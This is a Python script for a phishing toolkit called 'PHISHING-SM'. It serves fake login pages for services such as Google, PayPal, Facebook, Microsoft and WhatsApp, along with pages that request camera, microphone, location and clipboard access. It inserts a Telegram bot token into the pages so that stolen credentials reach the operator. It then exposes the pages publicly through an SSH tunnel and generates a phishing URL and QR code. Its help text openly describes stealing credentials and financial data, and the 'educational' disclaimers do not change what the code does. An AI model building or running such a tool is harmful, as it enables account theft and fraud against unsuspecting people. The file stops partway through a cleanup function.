#!/usr/bin/env python3
"""
PHISHING-SM Tool - Python Version
Educational penetration testing tool for authorized security testing only
"""

import os
import sys
import time
import socket
import subprocess
import threading
import requests
import re
import random
import signal
import select
import readline
from pathlib import Path

# Color codes for terminal output
class Colors:
    RED = '\033[1;91m'
    GREEN = '\033[1;92m'
    YELLOW = '\033[1;93m'
    BLUE = '\033[1;94m'
    PURPLE = '\033[1;95m'
    CYAN = '\033[1;96m'
    WHITE = '\033[1;97m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_BLUE = '\033[44m'
    BG_YELLOW = '\033[43m'
    BG_PURPLE = '\033[45m'
    NC = '\033[0m'

class PhishingTool:
    def __init__(self):
        self.current_token = ""
        self.php_pid = None
        self.ssh_pid = None
        self.tunnel_url = ""
        self.php_port = None
        self.user_id = ""
        self.selected_page = ""
        self.processes = []
        self.services_running = False
        
        # Available pages with single digit numbers
        self.pages = {
            "1": "amazon.php",
            "2": "camera.php", 
            "3": "collection.php",
            "4": "copy.php",
            "5": "discord.php",
            "6": "facebookg.php",
            "7": "freefire.php",
            "8": "github.php",
            "9": "google.php",
            "10": "instagram.php",
            "11": "location.php",
            "12": "microsoft.php",
            "13": "netflix.php",
            "14": "paypal.php",
            "15": "peace.php",
            "16": "pupgmobile.php",
            "17": "record.php",
            "18": "roblox.php",
            "19": "snab.php",
            "20": "spotify.php",
            "21": "telegram.php",
            "22": "tiktok.php",
            "23": "whatsapp.php",
            "24": "x.php",
            "25": "yallalido.php"
        }
        
        # Common ports for PHP server
        self.common_ports = [8080, 8081, 8082, 8083, 3333, 4444, 5555, 6666, 7777, 8888, 9999, 10000, 1337, 3000, 5000, 7000, 9000]
        
        # Set up signal handlers for cleanup
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

    def signal_handler(self, signum, frame):
        """Handle cleanup on exit signals"""
        self.cleanup()
        sys.exit(0)

    def print_color(self, text, color=Colors.WHITE, end="\n"):
        """Print colored text"""
        print(f"{color}{text}{Colors.NC}", end=end, flush=True)

    def print_banner(self):
        """Display the main banner"""
        os.system('clear')
        self.print_color("""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║  ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗███╗   ██╗ ██████╗ ███████╗██████╗   ║
║  ██╔══██╗██║  ██║██║██╔════╝██║  ██║██║████╗  ██║██╔════╝ ██╔════╝██╔══██╗  ║
║  ██████╔╝███████║██║███████╗███████║██║██╔██╗ ██║██║  ███╗█████╗  ██████╔╝  ║
║  ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║██║╚██╗██║██║   ██║██╔══╝  ██╔══██╗  ║
║  ██║     ██║  ██║██║███████║██║  ██║██║██║ ╚████║╚██████╔╝███████╗██║  ██║  ║
║  ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝  ║
║                                                                              ║
║                         ███████╗███╗   ███╗                                 ║
║                         ██╔════╝████╗ ████║                                 ║
║                         ███████╗██╔████╔██║                                 ║
║                         ╚════██║██║╚██╔╝██║                                 ║
║                         ███████║██║ ╚═╝ ██║                                 ║
║                         ╚══════╝╚═╝     ╚═╝                                 ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
""", Colors.CYAN)
        
        self.print_color(f"{Colors.BG_BLUE}{Colors.WHITE}════════════════════════════ TOOL INFORMATION ═══════════════════════════{Colors.NC}")
        self.print_color(f"[+] Tool      : {Colors.WHITE}PHISHING-SM V1{Colors.NC}", Colors.CYAN)
        self.print_color(f"[+] Version   : {Colors.WHITE}1.0{Colors.NC}", Colors.CYAN)
        self.print_color(f"[+] Coder     : {Colors.WHITE}@A_Y_TR{Colors.NC}", Colors.CYAN)
        self.print_color(f"[+] Channel   : {Colors.WHITE}https://t.me/cybersecurityTemDF{Colors.NC}", Colors.CYAN)
        self.print_color(f"{Colors.BG_BLUE}{Colors.WHITE}════════════════════════════════════════════════════════════════════════{Colors.NC}")
        self.print_color("[!] The developer is not responsible for any incorrect use of the tool...", Colors.YELLOW)
        self.print_color("[!] phishing tool..💉👻", Colors.RED)
        self.print_color("[+] All rights reserved: Mohamed Abu Al-Saud", Colors.GREEN)
        self.print_color(f"{Colors.BG_BLUE}{Colors.WHITE}════════════════════════════════════════════════════════════════════════{Colors.NC}")
        print()

    def show_help(self):
        """Display help information"""
        os.system('clear')
        self.print_color(f"{Colors.BG_PURPLE}{Colors.WHITE}══════════════════════════ TOOL HELP & INFORMATION ═══════════════════════════{Colors.NC}")
        self.print_color("""
╔══════════════════════════════════════════════════════════════════════════════╗
║                           PHISHING-SM TOOL HELP                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  This is a phishing tool designed to:                                        ║
║  • Steal browser credentials and send them to a Telegram bot                 ║
║  • Create fake registration pages for various services                       ║
║  • Collect device information and browser data                              ║
║  • Access wallet information and financial data                             ║
║                                                                              ║
║  WARNING: This tool should only be used for educational purposes            ║
║           and authorized penetration testing.                               ║
╚══════════════════════════════════════════════════════════════════════════════╝
""", Colors.CYAN)
        
        self.print_color(f"{Colors.BG_YELLOW}{Colors.WHITE}══════════════════════════ PAGES DESCRIPTION ═══════════════════════════{Colors.NC}")
        pages_info = [
            ("1", "Amazon", "Fake Amazon login page to steal Amazon account credentials"),
            ("2", "Camera", "Camera access request page to gain camera permissions"),
            ("3", "Collection", "Comprehensive device information collection"),
            ("4", "Copy", "Accessing the last thing copied to the device's clipboard"),
            ("5", "Discord", "Fake Discord login page to steal Discord account credentials"),
            ("6", "Facebook", "Fake Facebook login page to steal Facebook account credentials"),
            ("7", "Freefire", "Freefire game account login page"),
            ("8", "Github", "Fake GitHub login page to steal developer account credentials"),
            ("9", "Google", "Fake Google login page to steal Google account credentials"),
            ("10", "Instagram", "Fake Instagram login page to steal Instagram account credentials"),
            ("11", "Location", "Location access request page to obtain precise geolocation data"),
            ("12", "Microsoft", "Fake Microsoft login page to steal Microsoft account credentials"),
            ("13", "Netflix", "Fake Netflix login page to steal streaming service credentials"),
            ("14", "Paypal", "Fake PayPal login page to steal financial account credentials"),
            ("15", "Peace", "PES game login page"),
            ("16", "PubgMobile", "PUBG Mobile account login page"),
            ("17", "Record", "Audio recording access page to gain microphone permissions"),
            ("18", "Roblox", "Roblox game account login page"),
            ("19", "Snab", "Snab app phishing page"),
            ("20", "Spotify", "Fake Spotify login page to steal music streaming credentials"),
            ("21", "Telegram", "Fake Telegram login page to steal Telegram account credentials"),
            ("22", "Tiktok", "Fake TikTok login page to steal social media credentials"),
            ("23", "Whatsapp", "Fake WhatsApp login page to steal messaging app credentials"),
            ("24", "X", "Fake X (Twitter) login page to steal social media credentials"),
            ("25", "Yallalido", "Yalla Lido phishing page")
        ]
        
        for num, name, desc in pages_info:
            self.print_color(f"[{num}] {name:12} - {desc}", Colors.GREEN)
        
        self.print_color(f"\n{Colors.BG_RED}{Colors.WHITE}══════════════════════════ LEGAL WARNING ═══════════════════════════{Colors.NC}")
        self.print_color("[!] This tool is for educational and authorized testing only", Colors.RED)
        self.print_color("[!] Misuse of this tool is illegal and strictly prohibited", Colors.RED)
        self.print_color("[!] Developer is not responsible for any misuse or damage", Colors.RED)
        
        input(f"\n{Colors.YELLOW}[!] Press any key to return to main menu...{Colors.NC}")

    def show_loading(self, text, delay=0.1):
        """Show loading animation"""
        spin_chars = ['|', '/', '-', '\\']
        i = 0
        self.print_color(f"[+] {text} ", Colors.CYAN, end="")
        
        # Simple animation - in real implementation you'd track the actual process
        for _ in range(10):
            self.print_color(spin_chars[i], Colors.YELLOW, end="")
            sys.stdout.flush()
            time.sleep(delay)
            self.print_color("\b", end="")
            i = (i + 1) % 4
        
        self.print_color(f"{Colors.GREEN}✓{Colors.NC}")

    def check_dependencies(self):
        """Check and install required dependencies"""
        self.print_color("[+] Checking and installing dependencies...", Colors.CYAN)
        
        required_deps = ["php", "ssh", "curl"]
        optional_deps = ["qrencode", "tmux"]
        
        missing_required = []
        missing_optional = []
        
        for dep in required_deps:
            if self.check_command_exists(dep):
                self.print_color(f"[+] Found: {dep}", Colors.GREEN)
            else:
                self.print_color(f"[-] Missing required: {dep}", Colors.RED)
                missing_required.append(dep)
        
        for dep in optional_deps:
            if self.check_command_exists(dep):
                self.print_color(f"[+] Found: {dep}", Colors.GREEN)
            else:
                self.print_color(f"[-] Missing optional: {dep}", Colors.YELLOW)
                missing_optional.append(dep)
        
        if missing_required:
            self.print_color("[!] Installing missing dependencies...", Colors.YELLOW)
            if not self.install_dependencies(missing_required + missing_optional):
                return False
        
        self.print_color("[+] All dependencies are ready.", Colors.GREEN)
        return True

    def check_command_exists(self, command):
        """Check if a command exists in system PATH"""
        return subprocess.call(f"command -v {command}", shell=True, 
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0

    def install_dependencies(self, dependencies):
        """Install system dependencies"""
        package_managers = {
            'apt-get': ['apt-get', 'update', '-y'],
            'yum': ['yum', 'update', '-y'], 
            'pacman': ['pacman', '-Sy', '--noconfirm'],
            'brew': ['brew', 'update']
        }
        
        for manager, update_cmd in package_managers.items():
            if self.check_command_exists(manager.split()[0]):
                try:
                    # Update package lists
                    self.print_color(f"[!] Updating package lists with {manager}...", Colors.YELLOW)
                    subprocess.run(update_cmd, check=True, capture_output=True)
                    
                    # Install dependencies
                    install_cmd = []
                    if manager == 'apt-get':
                        install_cmd = ['apt-get', 'install', '-y']
                    elif manager == 'yum':
                        install_cmd = ['yum', 'install', '-y']
                    elif manager == 'pacman':
                        install_cmd = ['pacman', '-S', '--noconfirm']
                    elif manager == 'brew':
                        install_cmd = ['brew', 'install']
                    
                    install_cmd.extend(dependencies)
                    subprocess.run(install_cmd, check=True, capture_output=True)
                    self.print_color("[+] Dependencies installed successfully", Colors.GREEN)
                    return True
                    
                except subprocess.CalledProcessError as e:
                    self.print_color(f"[-] Failed to install dependencies with {manager}", Colors.RED)
                    return False
        
        self.print_color("[-] Cannot install dependencies automatically", Colors.RED)
        self.print_color(f"[!] Please install manually: {' '.join(dependencies)}", Colors.YELLOW)
        return False

    def validate_token(self, token):
        """Validate Telegram bot token format"""
        if len(token) > 40 and re.match(r'^[0-9]{8,10}:[a-zA-Z0-9_-]{35,}$', token):
            return True
        return False

    def validate_id(self, user_id):
        """Validate Telegram user ID"""
        return user_id.isdigit() and len(user_id) >= 5

    def search_and_replace_token(self, token):
        """Replace token placeholder in PHP files"""
        self.print_color("[+] Searching for BBOTTTTTTTTTTT in PHP files...", Colors.CYAN)
        
        updated_files = 0
        php_files = list(Path('.').glob('*.php'))
        
        for php_file in php_files:
            try:
                with open(php_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                
                if 'BBOTTTTTTTTTTT' in content:
                    self.print_color(f"[+] Found BBOTTTTTTTTTTT in: {php_file}", Colors.YELLOW)
                    content = content.replace('BBOTTTTTTTTTTT', token)
                    
                    with open(php_file, 'w', encoding='utf-8') as f:
                        f.write(content)
                    
                    # Verify replacement
                    with open(php_file, 'r', encoding='utf-8', errors='ignore') as f:
                        if token in f.read():
                            self.print_color(f"[✓] Successfully updated: {php_file}", Colors.GREEN)
                            updated_files += 1
                        else:
                            self.print_color(f"[-] Token not found in: {php_file} after replacement", Colors.RED)
            except Exception as e:
                self.print_color(f"[-] Error processing {php_file}: {str(e)}", Colors.RED)
        
        if updated_files == 0:
            self.print_color("[!] No files containing BBOTTTTTTTTTTT were found", Colors.YELLOW)
        
        self.print_color(f"[+] Total files updated: {updated_files}", Colors.GREEN)
        return updated_files > 0

    def revert_token(self):
        """Revert token changes in PHP files"""
        if not self.current_token:
            return
        
        self.print_color("[+] Reverting token in PHP files...", Colors.CYAN)
        reverted_files = 0
        
        for php_file in Path('.').glob('*.php'):
            try:
                with open(php_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                
                if self.current_token in content:
                    self.print_color(f"[+] Found token in: {php_file} - reverting...", Colors.YELLOW)
                    content = content.replace(self.current_token, 'BBOTTTTTTTTTTT')
                    
                    with open(php_file, 'w', encoding='utf-8') as f:
                        f.write(content)
                    reverted_files += 1
                    
            except Exception as e:
                self.print_color(f"[-] Error reverting {php_file}: {str(e)}", Colors.RED)
        
        self.print_color(f"[+] Reverted token in {reverted_files} files", Colors.GREEN)

    def show_pages_menu(self):
        """Display available pages menu"""
        self.print_color(f"{Colors.BG_BLUE}{Colors.WHITE}══════════════════════════ AVAILABLE PAGES ══════════════════════════{Colors.NC}")
        
        # Create menu layout with single digits
        menu_items = list(self.pages.items())
        for i in range(0, len(menu_items), 3):
            row = menu_items[i:i+3]
            line = f"{Colors.CYAN}│{Colors.NC}"
            for num, page in row:
                page_name = page.replace('.php', '').title()
                line += f"{Colors.GREEN} [{num}] {Colors.WHITE}{page_name:15}{Colors.CYAN}│{Colors.NC}"
            print(line)
        
        print(f"{Colors.CYAN}└─────────────────────────────────────────────────────────────────────────────┘{Colors.NC}")
        self.print_color(f"{Colors.BG_BLUE}{Colors.WHITE}════════════════════════════════════════════════════════════════════════{Colors.NC}")

    def stop_services(self):
        """Stop all running services"""
        self.print_color("[!] Stopping any existing PHP server...", Colors.YELLOW)
        
        # Stop PHP server
        if self.php_pid:
            try:
                os.kill(self.php_pid, signal.SIGTERM)
                os.waitpid(self.php_pid, 0)
            except (ProcessLookupError, ChildProcessError):
                pass
        
        # Stop SSH tunnel
        self.print_color("[!] Stopping any existing SSH tunnel...", Colors.YELLOW)
        if self.ssh_pid:
            try:
                os.kill(self.ssh_pid, signal.SIGTERM)
                os.waitpid(self.ssh_pid, 0)
            except (ProcessLookupError, ChildProcessError):
                pass
        
        # Kill any remaining processes
        subprocess.run("pkill -f 'php -S'", shell=True, capture_output=True)
        subprocess.run("pkill -f 'ssh.*localhost.run'", shell=True, capture_output=True)
        
        # Stop TMUX sessions if exists
        if self.check_command_exists('tmux'):
            subprocess.run("tmux kill-session -t phishing-tunnel 2>/dev/null", shell=True)
        
        time.sleep(2)
        self.php_pid = None
        self.ssh_pid = None
        self.services_running = False

    def check_port_available(self, port):
        """Check if a port is available"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(1)
                result = sock.connect_ex(('127.0.0.1', port))
                return result != 0
        except:
            return True

    def start_php_server(self):
        """Start PHP server on available port"""
        self.print_color("[+] Starting PHP server on localhost...", Colors.CYAN)
        
        # Find available port
        for port in self.common_ports:
            if self.check_port_available(port):
                self.php_port = port
                self.print_color(f"[+] Found available port: {port}", Colors.GREEN)
                break
        else:
            self.print_color("[-] No available ports found", Colors.RED)
            return False
        
        # Start PHP server
        try:
            cmd = ["php", "-S", f"127.0.0.1:{self.php_port}"]
            self.print_color(f"[+] Executing: {' '.join(cmd)}", Colors.YELLOW)
            
            # Start process and capture output
            with open('php_server.log', 'w') as log_file:
                process = subprocess.Popen(
                    cmd,
                    stdout=log_file,
                    stderr=subprocess.STDOUT,
                    preexec_fn=os.setsid
                )
                self.php_pid = process.pid
            
            # Wait for server to start
            self.print_color("[+] Waiting for PHP server to start...", Colors.CYAN)
            max_wait = 15
            for i in range(max_wait):
                time.sleep(1)
                if self.check_port_available(self.php_port) == False:  # Port is in use
                    self.print_color(f"[+] PHP server started successfully at http://localhost:{self.php_port}/", Colors.GREEN)
                    
                    # Test page access
                    try:
                        response = requests.get(f"http://127.0.0.1:{self.php_port}/{self.selected_page}", timeout=2)
                        if response.status_code == 200:
                            self.print_color(f"[✓] PHP page '{self.selected_page}' is accessible locally", Colors.GREEN)
                        else:
                            self.print_color(f"[!] PHP page '{self.selected_page}' returned status {response.status_code}", Colors.YELLOW)
                    except:
                        self.print_color(f"[!] PHP page '{self.selected_page}' may not be accessible locally", Colors.YELLOW)
                    
                    return True
                
                self.print_color(f"[!] Waiting for PHP server... ({i+1}/{max_wait})", Colors.YELLOW)
            
            self.print_color("[-] PHP server failed to start within timeout", Colors.RED)
            return False
            
        except Exception as e:
            self.print_color(f"[-] Failed to start PHP server: {str(e)}", Colors.RED)
            return False

    def start_ssh_tunnel(self):
        """Start SSH tunnel using localhost.run"""
        self.print_color("[+] Starting SSH tunnel...", Colors.CYAN)
        
        # Build SSH command
        ssh_key = "id_rsa" if Path("id_rsa").exists() else None
        if ssh_key:
            ssh_cmd = f"ssh -i {ssh_key} -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:{self.php_port} ssh.localhost.run"
        else:
            ssh_cmd = f"ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:{self.php_port} nokey@localhost.run"
        
        self.print_color(f"[+] Executing: {ssh_cmd}", Colors.YELLOW)
        
        if self.check_command_exists('tmux'):
            return self.start_ssh_tunnel_tmux(ssh_cmd)
        else:
            return self.start_ssh_tunnel_background(ssh_cmd)

    def start_ssh_tunnel_tmux(self, ssh_cmd):
        """Start SSH tunnel in TMUX session"""
        self.print_color("[+] Using TMUX for SSH tunnel session...", Colors.GREEN)
        
        # Kill existing session
        subprocess.run("tmux kill-session -t phishing-tunnel 2>/dev/null", shell=True)
        
        # Start new TMUX session
        subprocess.run(f"tmux new-session -d -s phishing-tunnel '{ssh_cmd}'", shell=True)
        time.sleep(5)
        
        # Check if session exists
        result = subprocess.run("tmux has-session -t phishing-tunnel 2>/dev/null", shell=True)
        if result.returncode != 0:
            self.print_color("[-] Failed to create TMUX session", Colors.RED)
            return False
        
        self.print_color("[+] SSH tunnel started in TMUX session: phishing-tunnel", Colors.GREEN)
        
        # Extract tunnel URL
        max_attempts = 25
        for attempt in range(max_attempts):
            time.sleep(3)
            
            # Get TMUX output
            result = subprocess.run("tmux capture-pane -t phishing-tunnel -p", shell=True, capture_output=True, text=True)
            output = result.stdout
            
            # Look for tunnel URL
            url_match = re.search(r'https://[^ ]*\.lhr\.life', output)
            if url_match:
                self.tunnel_url = url_match.group()
                self.print_color("[+] SSH tunnel established successfully!", Colors.GREEN)
                self.print_color(f"[+] Tunnel URL: {self.tunnel_url}", Colors.GREEN)
                
                # Save URL to file
                with open('current_tunnel.url', 'w') as f:
                    f.write(self.tunnel_url)
                
                # Test URL
                self.print_color("[!] Testing tunnel URL accessibility...", Colors.YELLOW)
                try:
                    response = requests.get(self.tunnel_url, timeout=5)
                    if response.status_code == 200:
                        self.print_color("[✓] Tunnel URL is accessible from the internet", Colors.GREEN)
                    else:
                        self.print_color(f"[!] Tunnel URL returned status {response.status_code}", Colors.YELLOW)
                except:
                    self.print_color("[!] Tunnel URL may not be accessible from the internet", Colors.YELLOW)
                
                self.print_color("[!] SSH tunnel is running in TMUX session: phishing-tunnel", Colors.YELLOW)
                self.print_color("[!] To view tunnel output: tmux attach -t phishing-tunnel", Colors.YELLOW)
                self.print_color("[!] To detach from TMUX: Ctrl+B then D", Colors.YELLOW)
                
                return True
            
            self.print_color(f"[!] Waiting for tunnel URL... (attempt {attempt+1}/{max_attempts})", Colors.YELLOW)
        
        self.print_color("[-] Could not establish SSH tunnel within timeout", Colors.RED)
        return False

    def start_ssh_tunnel_background(self, ssh_cmd):
        """Start SSH tunnel as background process"""
        self.print_color("[!] TMUX not available. Using background process...", Colors.YELLOW)
        
        timestamp = str(int(time.time()))
        log_file = f"ssh_tunnel_{timestamp}.log"
        
        self.print_color(f"[+] SSH output will be saved to: {log_file}", Colors.YELLOW)
        
        try:
            with open(log_file, 'w') as log:
                process = subprocess.Popen(
                    ssh_cmd,
                    shell=True,
                    stdout=log,
                    stderr=subprocess.STDOUT,
                    preexec_fn=os.setsid
                )
                self.ssh_pid = process.pid
            
            self.print_color(f"[+] SSH tunnel process started with PID: {self.ssh_pid}", Colors.GREEN)
            
            # Wait for tunnel URL
            max_attempts = 25
            for attempt in range(max_attempts):
                time.sleep(3)
                
                # Check if process is still running
                if not self.is_process_running(self.ssh_pid):
                    self.print_color("[-] SSH tunnel process died unexpectedly", Colors.RED)
                    if Path(log_file).exists():
                        with open(log_file, 'r') as f:
                            self.print_color("[!] SSH output:", Colors.YELLOW)
                            print(f.read())
                    return False
                
                # Check log for URL
                if Path(log_file).exists():
                    with open(log_file, 'r') as f:
                        content = f.read()
                        url_match = re.search(r'https://[^ ]*\.lhr\.life', content)
                        if url_match:
                            self.tunnel_url = url_match.group()
                            self.print_color("[+] SSH tunnel established successfully!", Colors.GREEN)
                            self.print_color(f"[+] Tunnel URL: {self.tunnel_url}", Colors.GREEN)
                            
                            with open('current_tunnel.url', 'w') as f:
                                f.write(self.tunnel_url)
                            
                            # Test URL
                            self.print_color("[!] Testing tunnel URL accessibility...", Colors.YELLOW)
                            try:
                                response = requests.get(self.tunnel_url, timeout=5)
                                if response.status_code == 200:
                                    self.print_color("[✓] Tunnel URL is accessible from the internet", Colors.GREEN)
                                else:
                                    self.print_color(f"[!] Tunnel URL returned status {response.status_code}", Colors.YELLOW)
                            except:
                                self.print_color("[!] Tunnel URL may not be accessible from the internet", Colors.YELLOW)
                            
                            return True
                
                self.print_color(f"[!] Waiting for tunnel URL... (attempt {attempt+1}/{max_attempts})", Colors.YELLOW)
            
            self.print_color("[-] Could not establish SSH tunnel within timeout", Colors.RED)
            return False
            
        except Exception as e:
            self.print_color(f"[-] Failed to start SSH tunnel: {str(e)}", Colors.RED)
            return False

    def is_process_running(self, pid):
        """Check if a process is running"""
        try:
            os.kill(pid, 0)
            return True
        except (ProcessLookupError, PermissionError):
            return False

    def generate_url(self):
        """Generate final phishing URL"""
        if not self.tunnel_url:
            self.print_color("[-] No tunnel URL available", Colors.RED)
            return False
        
        final_url = f"{self.tunnel_url}/{self.selected_page}?ID={self.user_id}"
        
        self.print_color(f"{Colors.BG_GREEN}{Colors.WHITE}══════════════════════════ GENERATED URL ═══════════════════════════{Colors.NC}")
        self.print_color(f"[+] Final URL: {Colors.WHITE}{final_url}{Colors.NC}", Colors.GREEN)
        self.print_color(f"{Colors.BG_GREEN}{Colors.WHITE}════════════════════════════════════════════════════════════════════════{Colors.NC}")
        
        # Save URL to file
        with open('generated_url.txt', 'w') as f:
            f.write(final_url)
        
        # Test URL
        self.print_color("[+] Testing final URL accessibility...", Colors.CYAN)
        try:
            response = requests.get(final_url, timeout=5)
            if response.status_code in [200, 301, 302]:
                self.print_color("[✓] Final URL is accessible and working!", Colors.GREEN)
            else:
                self.print_color(f"[!] Final URL returned status {response.status_code}", Colors.YELLOW)
        except:
            self.print_color("[!] Final URL may not be accessible", Colors.YELLOW)
        
        # Generate QR code if available
        if self.check_command_exists('qrencode'):
            self.print_color("[+] Generating QR code...", Colors.CYAN)
            subprocess.run(f"qrencode -t ANSIUTF8 '{final_url}'", shell=True)
        else:
            self.print_color("[!] qrencode not available - QR code generation skipped", Colors.YELLOW)
        
        return True

    def display_results(self):
        """Display current tool status and results"""
        self.print_color(f"\n{Colors.BG_BLUE}{Colors.WHITE}══════════════════════════ TOOL STATUS ═══════════════════════════{Colors.NC}")
        self.print_color(f"[+] Bot Token    : {Colors.WHITE}Configured successfully{Colors.NC}", Colors.GREEN)
        self.print_color(f"[+] Telegram ID  : {Colors.WHITE}{self.user_id}{Colors.NC}", Colors.GREEN)
        self.print_color(f"[+] Selected Page: {Colors.WHITE}{self.selected_page}{Colors.NC}", Colors.GREEN)
        
        if self.tunnel_url:
            self.print_color(f"[+] Tunnel URL  : {Colors.WHITE}{self.tunnel_url}{Colors.NC}", Colors.GREEN)
        
        if Path('generated_url.txt').exists():
            with open('generated_url.txt', 'r') as f:
                final_url = f.read().strip()
            self.print_color(f"[+] Phishing URL: {Colors.WHITE}{final_url}{Colors.NC}", Colors.GREEN)
        
        if self.php_pid:
            self.print_color(f"[+] PHP Server   : {Colors.WHITE}Running on port {self.php_port} (PID: {self.php_pid}){Colors.NC}", Colors.GREEN)
        
        # Check SSH tunnel status
        if self.check_command_exists('tmux') and subprocess.run("tmux has-session -t phishing-tunnel 2>/dev/null", shell=True).returncode == 0:
            self.print_color("[+] SSH Tunnel   : Running in TMUX session: phishing-tunnel", Colors.GREEN)
        elif self.ssh_pid and self.is_process_running(self.ssh_pid):
            self.print_color(f"[+] SSH Tunnel   : Running with PID: {self.ssh_pid}", Colors.GREEN)
        else:
            self.print_color("[-] SSH Tunnel   : Not running", Colors.RED)
        
        self.print_color(f"{Colors.BG_BLUE}{Colors.WHITE}════════════════════════════════════════════════════════════════════════{Colors.NC}")

    def wait_for_services(self):
        """Monitor services and provide interactive control"""
        self.services_running = True
        self.print_color(f"\n{Colors.YELLOW}[!] Services are now running...{Colors.NC}")
        
        has_tmux = self.check_command_exists('tmux') and subprocess.run("tmux has-session -t phishing-tunnel 2>/dev/null", shell=True).returncode == 0
        
        while self.services_running:
            try:
                self.print_color(f"\n{Colors.BG_PURPLE}{Colors.WHITE}══════════════════════════ CONTROL PANEL ═══════════════════════════{Colors.NC}")
                
                if has_tmux:
                    self.print_color(f"[+] PHP Server PID: {self.php_pid}", Colors.CYAN)
                    self.print_color("[+] SSH Tunnel TMUX: phishing-tunnel", Colors.CYAN)
                    self.print_color(f"[+] PHP Server: http://localhost:{self.php_port}/", Colors.CYAN)
                    self.print_color("[!] Commands: [q]uit [t]mux [r]efresh [u]rl [s]tatus [b]ack", Colors.YELLOW)
                else:
                    self.print_color(f"[+] PHP Server PID: {self.php_pid}", Colors.CYAN)
                    if self.ssh_pid:
                        self.print_color(f"[+] SSH Tunnel PID: {self.ssh_pid}", Colors.CYAN)
                    self.print_color(f"[+] PHP Server: http://localhost:{self.php_port}/", Colors.CYAN)
                    self.print_color("[!] Commands: [q]uit [r]efresh [u]rl [l]ogs [s]tatus [b]ack", Colors.YELLOW)
                
                self.print_color(f"{Colors.BG_PURPLE}{Colors.WHITE}════════════════════════════════════════════════════════════════════════{Colors.NC}")
                
                if has_tmux:
                    prompt = "Enter command (q/t/r/u/s/b): "
                else:
                    prompt = "Enter command (q/r/u/l/s/b): "
                
                user_input = input(f"{Colors.GREEN}[+]{Colors.NC} {prompt}").strip().lower()
                
                if user_input == 'q':
                    self.print_color("[!] Stopping services...", Colors.YELLOW)
                    self.stop_services()
                    self.services_running = False
                    break
                
                elif user_input == 't' and has_tmux:
                    self.print_color("[+] Attaching to TMUX tunnel session...", Colors.CYAN)
                    self.print_color("[!] To detach from TMUX: Ctrl+B then D", Colors.YELLOW)
                    subprocess.run("tmux attach -t phishing-tunnel", shell=True)
                    self.print_color("[+] Returned from TMUX session", Colors.CYAN)
                
                elif user_input == 'r':
                    self.refresh_status()
                
                elif user_input == 'u':
                    if Path('generated_url.txt').exists():
                        with open('generated_url.txt', 'r') as f:
                            final_url = f.read().strip()
                        self.print_color(f"[+] Current URL: {final_url}", Colors.GREEN)
                    else:
                        self.print_color("[-] No URL generated", Colors.RED)
                
                elif user_input == 'l' and not has_tmux and self.ssh_pid:
                    log_files = list(Path('.').glob('ssh_tunnel_*.log'))
                    if log_files:
                        latest_log = max(log_files, key=lambda x: x.stat().st_mtime)
                        self.print_color(f"[+] Showing SSH tunnel logs from {latest_log}:", Colors.CYAN)
                        with open(latest_log, 'r') as f:
                            lines = f.readlines()[-20:]
                            print(''.join(lines))
                    else:
                        self.print_color("[-] No SSH tunnel log file found", Colors.RED)
                
                elif user_input == 's':
                    self.display_results()
                
                elif user_input == 'b':
                    self.print_color("[!] Returning to main menu...", Colors.YELLOW)
                    self.stop_services()
                    self.services_running = False
                    break
                
                # Check if services are still running
                if not self.is_process_running(self.php_pid):
                    self.print_color("[-] PHP server stopped unexpectedly", Colors.RED)
                    self.services_running = False
                    break
                
                if has_tmux:
                    if subprocess.run("tmux has-session -t phishing-tunnel 2>/dev/null", shell=True).returncode != 0:
                        self.print_color("[-] SSH tunnel stopped unexpectedly", Colors.RED)
                        self.services_running = False
                        break
                elif self.ssh_pid and not self.is_process_running(self.ssh_pid):
                    self.print_color("[-] SSH tunnel stopped unexpectedly", Colors.RED)
                    self.services_running = False
                    break
                    
            except (KeyboardInterrupt, EOFError):
                self.print_color("\n[!] Stopping services...", Colors.YELLOW)
                self.stop_services()
                self.services_running = False
                break

    def refresh_status(self):
        """Refresh and display service status"""
        self.print_color("[+] Refreshing service status...", Colors.CYAN)
        
        # Check PHP server
        if self.php_pid and self.is_process_running(self.php_pid):
            self.print_color(f"[✓] PHP Server running (PID: {self.php_pid})", Colors.GREEN)
            try:
                response = requests.get(f"http://127.0.0.1:{self.php_port}/", timeout=2)
                self.print_color("[✓] PHP Server is responding", Colors.GREEN)
            except:
                self.print_color("[-] PHP Server is not responding", Colors.RED)
        else:
            self.print_color("[-] PHP Server not running", Colors.RED)
        
        # Check SSH tunnel
        has_tmux = self.check_command_exists('tmux') and subprocess.run("tmux has-session -t phishing-tunnel 2>/dev/null", shell=True).returncode == 0
        
        if has_tmux:
            self.print_color("[✓] SSH Tunnel running in TMUX", Colors.GREEN)
            if self.tunnel_url:
                self.print_color(f"[✓] Tunnel URL: {self.tunnel_url}", Colors.GREEN)
                try:
                    response = requests.get(self.tunnel_url, timeout=5)
                    self.print_color("[✓] Tunnel URL is accessible", Colors.GREEN)
                except:
                    self.print_color("[-] Tunnel URL is not accessible", Colors.RED)
        elif self.ssh_pid and self.is_process_running(self.ssh_pid):
            self.print_color(f"[✓] SSH Tunnel running (PID: {self.ssh_pid})", Colors.GREEN)
            if self.tunnel_url:
                self.print_color(f"[✓] Tunnel URL: {self.tunnel_url}", Colors.GREEN)
                try:
                    response = requests.get(self.tunnel_url, timeout=5)
                    self.print_color("[✓] Tunnel URL is accessible", Colors.GREEN)
                except:
                    self.print_color("[-] Tunnel URL is not accessible", Colors.RED)
        else:
            self.print_color("[-] SSH Tunnel not running", Colors.RED)

    def cleanup(self):
